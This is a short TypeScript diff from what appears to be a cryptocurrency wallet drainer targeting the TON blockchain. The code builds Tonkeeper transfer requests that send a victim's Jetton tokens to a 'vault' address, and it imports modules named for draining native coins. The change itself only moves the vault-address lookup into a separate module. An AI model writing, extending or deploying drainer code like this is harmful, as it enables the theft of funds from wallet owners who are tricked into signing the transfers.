@@ -7,6 +7,7 @@ import { JettonMaster, TonClient } from '@ton/ton'
 import { resolveTonCenterJsonRpcUrl, tonCenterApiHeaders } from './ton-sensory-armor.js'
 import { parseNativeAmount } from './native-coin-drain.js'
 import { broadcastSignedTonNativeTransfer } from './ton-native-drain.js'
+import { resolveTonVaultAddress } from './operational-vault.js'
 
 export type JettonTransferRequest = {
   from: string
@@ -17,14 +18,6 @@ export type JettonTransferRequest = {
   validUntil: number
   messages: Array<{ address: string; amount: string; payload?: string }>
   wallet: 'tonkeeper'
-}
-
-function resolveTonVaultAddress(): string | null {
-  const raw =
-    (typeof process !== 'undefined' ? process.env['VAULT_ADDRESS_TON'] : undefined)?.trim() ||
-    (typeof process !== 'undefined' ? process.env['SOVEREIGN_VAULT_TON'] : undefined)?.trim() ||
-    ''
-  return raw || null
 }
 
 function createTonClient(endpoint: string): TonClient {
@@ -113,7 +106,7 @@ export async function buildJettonDrainForBatch(params: {
   rpcUrl?: string
 }): Promise<JettonTransferRequest | null> {
   if (params.amount <= 0n) return null
-  const vault = params.vault ?? resolveTonVaultAddress()
+  const vault = params.vault ?? (await resolveTonVaultAddress())
   if (!vault) {
     throw new Error('VAULT_ADDRESS_TON or SOVEREIGN_VAULT_TON required for Jetton drain')
   }
